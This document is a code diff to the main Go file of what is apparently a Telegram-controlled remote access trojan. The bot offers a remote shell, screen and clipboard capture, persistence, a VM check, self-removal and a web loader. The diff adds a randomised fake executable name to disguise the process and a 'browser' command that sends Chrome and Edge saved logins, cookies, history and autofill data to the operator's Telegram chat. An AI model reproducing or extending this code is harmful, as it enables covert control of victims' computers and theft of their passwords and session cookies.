@@ -2,6 +2,7 @@ package main
 
 import (
 	"log"
+	"math/rand"
 	"os"
 	"strings"
 
@@ -12,8 +13,10 @@ import (
 )
 
 func main() {
+	FAKENAME := &conf.ARR_NNAME[rand.Intn(8)]
 	f := &lib.FileInf{
-		FileName: strings.TrimSuffix(conf.NNAME, ".exe"), //Name of the new registry string.
+		FileName: strings.TrimSuffix(*FAKENAME, ".exe"), //Name of the new registry string.
+		NNAME:    *FAKENAME,
 	}
 	f.Startup()
 	f.RuntimeVM()
@@ -31,6 +34,7 @@ func main() {
 	if err != nil {
 		log.Panic(err)
 	}
+
 	for update := range updates {
 		if update.Message != nil {
 			telComd := update.Message.Command()
@@ -58,11 +62,12 @@ func main() {
 					f.SelfRemove()
 				case "shell", "sh":
 					msg.Text = f.RShell(command())
-				case "cookie":
-					f.FileName = lib.Argument(command(), " ", 1)
-					msg.Text = f.Cookies(lib.Argument(command(), " ", 2))
 				case "download":
+					msg.Text = "download " + lib.Argument(command(), " ", 1)
 					bot.Send(tg.NewDocumentUpload(chatID, lib.Argument(command(), " ", 1)))
+				case "webload":
+					f.FileName = lib.Argument(command(), " ", 1)
+					msg.Text = f.WebLoad(lib.Argument(command(), " ", 2))
 				case "screen":
 					f.FileName = lib.Argument(command(), " ", 1)
 					msg.Text = f.CaptureScreen()
@@ -74,6 +79,23 @@ func main() {
 						lib.Argument(command(), " ", 2),
 						lib.Argument(command(), " ", 3),
 						lib.Argument(command(), " ", 4))
+				case "browser":
+					switch lib.Argument(command(), " ", 1) {
+					case "--dc":
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\History"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Bookmarks"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Web Data"))
+					case "--dm":
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\History"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"))
+						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Web Data"))
+					default:
+						msg.Text = "Can not find method name \"" + lib.Argument(command(), " ", 1) + "\""
+					}
 				case "clipboard":
 					msg.Text = f.GetClipboard()
 				}
